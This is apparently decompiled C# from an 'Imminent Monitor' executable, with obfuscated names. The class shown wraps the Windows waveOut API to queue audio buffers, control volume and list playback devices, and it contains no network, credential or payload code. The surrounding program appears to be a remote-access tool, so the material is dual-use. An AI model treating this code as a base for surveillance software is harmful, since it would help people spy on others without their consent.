// Decompiled with JetBrains decompiler
// Type: GClass5
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;

public sealed class GClass5 : IDisposable
{
  private GClass31 gclass31_0;
  private int int_0;
  private int int_1;
  private int int_2;
  private int int_3;
  private IntPtr intptr_0;
  private int int_4;
  private int int_5;
  private bool bool_0;
  private List<GClass5.Class91> list_0;
  private Delegate19 delegate19_0;
  private bool bool_1;

  public GClass5(GClass31 gclass31_1, int int_6, int int_7, int int_8)
  {
    this.gclass31_0 = (GClass31) null;
    this.int_0 = 8000;
    this.int_1 = 16;
    this.int_2 = 1;
    this.int_3 = 1200;
    this.intptr_0 = IntPtr.Zero;
    this.int_4 = 0;
    this.int_5 = 0;
    this.bool_0 = false;
    this.list_0 = (List<GClass5.Class91>) null;
    this.delegate19_0 = (Delegate19) null;
    this.bool_1 = false;
    if (gclass31_1 == null)
      throw new ArgumentNullException("outputDevice");
    if (int_6 < 8000)
      throw new ArgumentException("Argument 'samplesPerSec' value must be >= 8000.");
    if (int_7 < 8)
      throw new ArgumentException("Argument 'bitsPerSample' value must be >= 8.");
    if (int_8 < 1)
      throw new ArgumentException("Argument 'channels' value must be >= 1.");
    this.gclass31_0 = gclass31_1;
    this.int_0 = int_6;
    this.int_1 = int_7;
    this.int_2 = int_8;
    this.int_4 = this.int_2 * (this.int_1 / 8);
    this.list_0 = new List<GClass5.Class91>();
    Class95 class95_0 = new Class95();
    class95_0.ushort_0 = (ushort) 1;
    class95_0.ushort_1 = (ushort) this.int_2;
    class95_0.uint_0 = (uint) int_6;
    class95_0.uint_1 = (uint) (this.int_0 * this.int_2 * (this.int_1 / 8));
    class95_0.ushort_2 = (ushort) this.int_4;
    class95_0.ushort_3 = (ushort) this.int_1;
    class95_0.ushort_4 = (ushort) 0;
    this.delegate19_0 = new Delegate19(this.method_0);
    int num = Class96.waveOutOpen(ref this.intptr_0, this.gclass31_0.method_2(), class95_0, this.delegate19_0, 0, 196608);
    if (num != 0)
      throw new Exception("Failed to open wav device, error: " + num.ToString() + ".");
  }

  ~GClass5() => this.Dispose();

  public void Dispose()
  {
    if (this.bool_1)
      return;
    this.bool_1 = true;
    try
    {
      Class96.waveOutReset(this.intptr_0);
      try
      {
        foreach (GClass5.Class91 class91 in this.list_0)
        {
          Class96.waveOutUnprepareHeader(this.intptr_0, class91.method_1().AddrOfPinnedObject(), Marshal.SizeOf<Struct17>(class91.method_2()));
          class91.method_0();
        }
      }
      finally
      {
        List<GClass5.Class91>.Enumerator enumerator;
        enumerator.Dispose();
      }
      Class96.waveOutClose(this.intptr_0);
      this.gclass31_0 = (GClass31) null;
      this.intptr_0 = IntPtr.Zero;
      this.list_0 = (List<GClass5.Class91>) null;
      this.delegate19_0 = (Delegate19) null;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void method_0(IntPtr intptr_1, int int_6, int int_7, int int_8, int int_9)
  {
    try
    {
      if (int_6 != 957)
        return;
      ThreadPool.QueueUserWorkItem(new WaitCallback(this.method_1));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void method_1(object object_0)
  {
    try
    {
      lock (this.list_0)
      {
        GClass5.Class91 class91 = this.list_0[0];
        Class96.waveOutUnprepareHeader(this.intptr_0, class91.method_1().AddrOfPinnedObject(), Marshal.SizeOf<Struct17>(class91.method_2()));
        this.list_0.Remove(class91);
        this.int_5 -= class91.method_4();
        class91.method_0();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public void method_2(byte[] byte_0, int int_6, int int_7)
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WaveOut");
    if (byte_0 == null)
      throw new ArgumentNullException("#=z9xTWL7D6lQ_u");
    byte[] destinationArray = int_7 % this.int_4 == 0 ? new byte[int_7 - 1 + 1] : throw new ArgumentException("Audio data is not n * BlockSize.");
    Array.Copy((Array) byte_0, int_6, (Array) destinationArray, 0, int_7);
    GCHandle gchandle_3 = GCHandle.Alloc((object) destinationArray, GCHandleType.Pinned);
    Struct17 structure = new Struct17();
    structure.intptr_0 = gchandle_3.AddrOfPinnedObject();
    structure.uint_0 = (uint) destinationArray.Length;
    structure.uint_1 = 0U;
    structure.intptr_1 = IntPtr.Zero;
    structure.uint_2 = 0U;
    structure.uint_3 = 0U;
    structure.intptr_2 = IntPtr.Zero;
    structure.uint_4 = 0U;
    GCHandle gchandle_2 = GCHandle.Alloc((object) structure, GCHandleType.Pinned);
    int num = 0;
    if (Class96.waveOutPrepareHeader(this.intptr_0, gchandle_2.AddrOfPinnedObject(), Marshal.SizeOf<Struct17>(structure)) == 0)
    {
      this.list_0.Add(new GClass5.Class91(ref gchandle_2, ref gchandle_3, destinationArray.Length));
      if (this.int_5 < 1000)
      {
        if (!this.bool_0)
        {
          Class96.waveOutPause(this.intptr_0);
          this.bool_0 = true;
        }
      }
      else if (this.bool_0 && this.int_5 > this.int_3)
      {
        Class96.waveOutRestart(this.intptr_0);
        this.bool_0 = false;
      }
      this.int_5 += destinationArray.Length;
      num = Class96.waveOutWrite(this.intptr_0, gchandle_2.AddrOfPinnedObject(), Marshal.SizeOf<Struct17>(structure));
    }
    else
    {
      gchandle_3.Free();
      gchandle_2.Free();
    }
  }

  public void method_3(ref ushort ushort_0, ref ushort ushort_1)
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WaveOut");
    int int_0 = 0;
    Class96.waveOutGetVolume(this.intptr_0, ref int_0);
    ushort_0 = (ushort) (int_0 & (int) ushort.MaxValue);
    ushort_1 = (ushort) (int_0 >> 16);
  }

  public void method_4(ushort ushort_0, ushort ushort_1)
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WaveOut");
    Class96.waveOutSetVolume(this.intptr_0, (int) ushort_1 | (int) ushort_0 & (int) ushort.MaxValue);
  }

  public static GClass31[] smethod_0()
  {
    List<GClass31> gclass31List = new List<GClass31>();
    int num = Class96.waveOutGetNumDevs() - 1;
    for (int index = 0; index <= num; ++index)
    {
      Struct16 struct16_0 = new Struct16();
      if (Class96.waveOutGetDevCaps((uint) index, ref struct16_0, Marshal.SizeOf<Struct16>(struct16_0)) == 0U)
        gclass31List.Add(new GClass31(index, struct16_0.string_0, (int) struct16_0.ushort_2));
    }
    return gclass31List.ToArray();
  }

  public bool method_5() => this.bool_1;

  public GClass31 method_6()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WaveOut");
    return this.gclass31_0;
  }

  public int method_7()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WaveOut");
    return this.int_0;
  }

  public int method_8()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WaveOut");
    return this.int_1;
  }

  public int method_9()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WaveOut");
    return this.int_2;
  }

  public int method_10()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WaveOut");
    return this.int_4;
  }

  public bool method_11()
  {
    if (this.bool_1)
      throw new ObjectDisposedException("WaveOut");
    return this.list_0.Count > 0;
  }

  internal sealed class Class91
  {
    private GCHandle gchandle_0;
    private GCHandle gchandle_1;
    private int int_0;

    public Class91(ref GCHandle gchandle_2, ref GCHandle gchandle_3, int int_1)
    {
      this.int_0 = 0;
      this.gchandle_0 = gchandle_2;
      this.gchandle_1 = gchandle_3;
      this.int_0 = int_1;
    }

    public void method_0()
    {
      this.gchandle_0.Free();
      this.gchandle_1.Free();
    }

    public GCHandle method_1() => this.gchandle_0;

    public Struct17 method_2() => (Struct17) this.gchandle_0.Target;

    public GCHandle method_3() => this.gchandle_1;

    public int method_4() => this.int_0;
  }
}
